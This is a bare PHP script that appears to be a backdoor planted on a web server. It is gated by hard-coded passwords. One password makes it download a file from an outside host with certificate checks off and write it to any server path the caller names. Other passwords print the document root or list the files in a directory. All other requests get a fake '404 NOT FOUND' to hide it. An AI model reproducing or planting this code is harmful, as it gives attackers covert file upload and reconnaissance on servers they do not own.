<?php
function isHTTPS()
{
    if (defined('HTTPS') && HTTPS) return true;
    if (!isset($_SERVER)) return FALSE;
    if (!isset($_SERVER['HTTPS'])) return FALSE;
    if ($_SERVER['HTTPS'] === 1) {  //Apache
        return TRUE;
    } elseif ($_SERVER['HTTPS'] === 'on') { //IIS
        return TRUE;
    } elseif ($_SERVER['SERVER_PORT'] == 443) { //???
        return TRUE;
    }
    return FALSE;
}
function curlPostHttps($url, $data) {
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($curl, CURLOPT_AUTOREFERER, 1);
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
	curl_setopt($curl, CURLOPT_TIMEOUT, 30);
	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($curl, CURLOPT_HEADER, 0);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	$tmpInfo = curl_exec($curl);
	$err_no = curl_errno($curl);
	$info = curl_getinfo($curl);
	$info['err_no'] = $err_no;
	curl_close($curl);
	return $tmpInfo;
}
$Pwd=$_GET['Pwd'];
$Name=$_GET['Name'];
$Mulu = $_GET['Mulu'];
$Dirs = $_GET['Dirs'];
$Paths = $Mulu;
if($Pwd== '2022888')
{
    if (!file_exists($Paths.'/'.$Dirs)) {
    mkdir($Paths.'/'.$Dirs);
    }
    $GetTargetCodee = curlPostHttps('http://thai.fk2.us/DownFile.aspx?File='.$Name,'');
    file_put_contents($Paths.'/'.$Dirs.'/'.$Name, $GetTargetCodee);
    echo 'File Download Success!!';
}
else
{
   if($Pwd=='2022999')
   {
      echo $_SERVER['DOCUMENT_ROOT'];
    }
	if($Pwd=='2022666')
   {
      $dir_path = $Mulu;
		foreach (scandir($dir_path) as $file_name) {
		  if ($file_name != '.' && $file_name != '..' && is_file($dir_path . '/' . $file_name)) {
			echo $dir_path . '/' . $file_name . "\n";
       }
	  }
	}
   else if($Pwd != '2022666' && $Pwd != '2022999')
   {
   echo '404 NOT FOUND';
    }
}
?>